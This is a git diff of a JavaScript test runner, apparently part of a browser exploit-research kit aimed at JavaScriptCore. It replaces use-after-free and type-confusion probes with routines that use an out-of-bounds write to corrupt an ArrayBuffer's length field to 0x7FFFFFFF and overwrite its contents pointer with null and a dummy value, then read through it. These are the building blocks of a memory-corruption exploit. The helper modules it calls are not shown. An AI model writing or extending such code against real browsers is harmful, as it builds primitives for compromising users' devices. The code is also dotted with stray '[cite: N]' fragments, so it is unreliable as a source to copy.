@@ -1,71 +1,71 @@
 // js/script3/runAllAdvancedTestsS3.mjs
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
-import { executeUAFTypeConfusionTestWithValue } from './testJsonTypeConfusionUAFSpeculative.mjs'; // currentCallCount_for_UAF_TC_test é exportado daqui
-import { OOB_CONFIG, KNOWN_STRUCTURE_IDS } from '../config.mjs';
-import { toHex } from '../utils.mjs';
+import { executeCorruptArrayBufferMetadataTest } from './testCorruptMetadata.mjs'; 
+import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; 
+import { AdvancedInt64, toHex } from '../utils.mjs';
 
-async function runUAFTypeConfusion_VaryOOBValue_At_0x70() {
-    const FNAME_RUNNER = "runUAFTypeConfusion_VaryOOBValue_At_0x70";
-    logS3(`==== INICIANDO Testes UAF/TC: Variando Valor OOB em 0x70 (toJSON Detalhada com DepthCtrl+Slice) ====`, 'test', FNAME_RUNNER);
+async function runAggressiveMetadataCorruptionTestsWithActiveCheck() {
+    const FNAME_RUNNER = "runAggressiveMetadataCorruptionTestsWithActiveCheck";
+    logS3(`==== INICIANDO Testes Agressivos de Corrupção de Metadados AB (com Verificação Ativa) ====`, 'test', FNAME_RUNNER); // [cite: 2486]
+    
+    // Teste 1: Tentar corromper o TAMANHO do oob_array_buffer_real
+    const offsetCorromperTamanho = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16); // [cite: 2487, 2450]
+    logS3(`\n--- Testando Corrupção de Tamanho do ArrayBuffer (Offset: ${toHex(offsetCorromperTamanho)}) ---`, 'subtest', FNAME_RUNNER); // [cite: 2488]
+    await executeCorruptArrayBufferMetadataTest(
+        "Corrupt_AB_Size_to_Large_ActiveCheck",
+        offsetCorromperTamanho, 
+        0x7FFFFFFF,             
+        4,                      
+        false                   // isPointerCorruptionTest = false // [cite: 2489]
+    );
+    await PAUSE_S3(MEDIUM_PAUSE_S3); // [cite: 2490]
 
-    const values_to_write_at_0x70 = [
-        { desc: "Val_00000000", val: 0x00000000 },
-        { desc: "Val_00000001", val: 0x00000001 },
-        { desc: "Val_41414141", val: 0x41414141 },
-        { desc: "Val_FFFFFFFF", val: 0xFFFFFFFF },
-        { desc: "Val_80000000", val: 0x80000000 }, 
-        { desc: "Val_7FFFFFFF", val: 0x7FFFFFFF },
-    ];
+    // Teste 2: Corromper o PONTEIRO DE CONTEÚDO para Nulo e tentar ler
+    const offsetCorromperConteudoPtr = parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16); // [cite: 2491, 2454]
+    logS3(`\n--- Testando Corrupção de Ponteiro de Conteúdo do AB (Anular) e TENTAR LER (Offset: ${toHex(offsetCorromperConteudoPtr)}) ---`, 'subtest', FNAME_RUNNER); // [cite: 2491]
+    await executeCorruptArrayBufferMetadataTest(
+        "Corrupt_AB_ContentsPtr_to_Null_And_Read",
+        offsetCorromperConteudoPtr, 
+        new AdvancedInt64(0,0),   
+        8,                        
+        true                      // isPointerCorruptionTest = true // [cite: 2492]
+    );
+    await PAUSE_S3(MEDIUM_PAUSE_S3); // [cite: 2493]
+    
+    // Teste 3: Corromper o PONTEIRO DE CONTEÚDO para Dummy e tentar ler
+    logS3(`\n--- Testando Corrupção de Ponteiro de Conteúdo do AB (Dummy) e TENTAR LER (Offset: ${toHex(offsetCorromperConteudoPtr)}) ---`, 'subtest', FNAME_RUNNER); // [cite: 2494]
+    await executeCorruptArrayBufferMetadataTest(
+        "Corrupt_AB_ContentsPtr_to_Dummy_And_Read",
+        offsetCorromperConteudoPtr, 
+        new AdvancedInt64("0x4141414142424242"), 
+        8,                        
+        true                      // isPointerCorruptionTest = true // [cite: 2495]
+    );
+    await PAUSE_S3(MEDIUM_PAUSE_S3); // [cite: 2495]
 
-    if (KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER && !KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER.includes("FILL_ME_IN")) {
-        const sid = parseInt(KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER, 16);
-        if (!isNaN(sid)) {
-            values_to_write_at_0x70.push({ desc: `StructID_AB_${toHex(sid)}`, val: sid });
-        }
-    }
-    // Adicione mais StructureIDs aqui se desejar
-
-    for (const test_case of values_to_write_at_0x70) {
-        const testDescription = `VaryVal_OOB_${test_case.desc}_Offset0x70`;
-        logS3(`\n--- Executando Teste UAF/TC: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
-        
-        let result = await executeUAFTypeConfusionTestWithValue(
-            testDescription,
-            test_case.val
-        );
-
-        // Acessa result.calls que deve ser o currentCallCount_for_UAF_TC_test retornado
-        if (result.potentiallyFroze) {
-            logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
-        } else if (result.errorOccurred) {
-            logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
-            if(result.errorOccurred.stack) logS3(`      Stack: ${result.errorOccurred.stack}`, "warn");
-        } else {
-            logS3(`   RESULTADO ${testDescription}: Completou. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
-            logS3(`      Stringify Result: ${String(result.stringifyResult).substring(0,200)}`, "info", FNAME_RUNNER);
-        }
-        await PAUSE_S3(MEDIUM_PAUSE_S3);
-        logS3(`   Título da página após teste ${testDescription}: ${document.title}`, "info");
-    }
-
-    logS3(`==== Testes UAF/TC com Valores OOB Variados em 0x70 CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
+    logS3(`==== Testes Agressivos de Corrupção de Metadados (com Verificação Ativa) CONCLUÍDOS ====`, 'test', FNAME_RUNNER); // [cite: 2496]
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_UAFTypeConfusion_VaryOOBValue';
+    const FNAME = 'runAllAdvancedTestsS3_AggressiveCorrupt_ActiveCheck';
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
-    if (runBtn) runBtn.disabled = true;
-    if (outputDiv) outputDiv.innerHTML = '';
+    if (runBtn) runBtn.disabled = true; // [cite: 2498]
+    if (outputDiv) outputDiv.innerHTML = ''; // [cite: 2498]
 
-    logS3(`==== INICIANDO Script 3: Testes UAF/TC com Valores OOB Variados em 0x70 (toJSON Detalhada com DepthCtrl+Slice) ====`,'test', FNAME);
-    document.title = "Iniciando Script 3 - UAF/TC Vary OOB Value @0x70";
+    logS3(`==== INICIANDO Script 3: Testes Agressivos de Corrupção de Metadados AB (com Verificação Ativa) ====`,'test', FNAME); // [cite: 2499]
+    document.title = "Iniciando Script 3 - Corrupção Agressiva AB (Verificação Ativa)"; // [cite: 2499]
     
-    await runUAFTypeConfusion_VaryOOBValue_At_0x70();
+    await runAggressiveMetadataCorruptionTestsWithActiveCheck(); // [cite: 2500]
     
-    logS3(`\n==== Script 3 CONCLUÍDO (Testes UAF/TC com Valores OOB Variados em 0x70) ====`,'test', FNAME);
-    if (runBtn) runBtn.disabled = false;
-    document.title = "Script 3 Concluído - UAF/TC Vary OOB Value @0x70";
+    logS3(`\n==== Script 3 CONCLUÍDO (Testes Agressivos de Corrupção de Metadados AB com Verificação Ativa) ====`,'test', FNAME); // [cite: 2501]
+    if (runBtn) runBtn.disabled = false; // [cite: 2501]
+    // Ajuste no título final para refletir o estado real
+    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CRASH")) {
+        // Manter título de erro/crash ou o inicial se nada mudou drasticamente
+    } else {
+        document.title = "Script 3 Concluído - Corrupção Agressiva AB";
+    }
 }
